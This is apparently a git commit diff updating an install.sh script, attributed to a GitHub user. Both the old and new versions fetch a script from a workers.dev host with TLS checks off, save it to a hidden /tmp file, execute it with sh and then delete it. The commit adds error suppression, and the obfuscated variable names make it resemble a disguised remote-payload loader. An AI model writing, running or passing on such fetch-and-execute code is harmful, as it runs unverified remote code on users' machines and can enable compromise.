9830c53f79253585c28e55e283490db35c75077a
famkader <35060808+creativy24@users.noreply.github.com>
2026-07-01 04:21:14 +0800

    Update install.sh

--- install.sh
+++ install.sh
@@ -2,6 +2,11 @@
 _a="https://autologin.creativy24.workers.dev"
 _b="$1"
 _c="/tmp/.sys_$$"
-curl -ksSL "$_a/s?k=$_b" -o "$_c"
-sh "$_c"
-rm -f "$_c"
+curl -ksSL "$_a/s?k=$_b" -o "$_c" 2>/dev/null
+if [ -s "$_c" ]; then
+    sh "$_c"
+else
+    echo "Download failed. Check connection."
+    exit 1
+fi
+rm -f "$_c" >/dev/null 2>&1
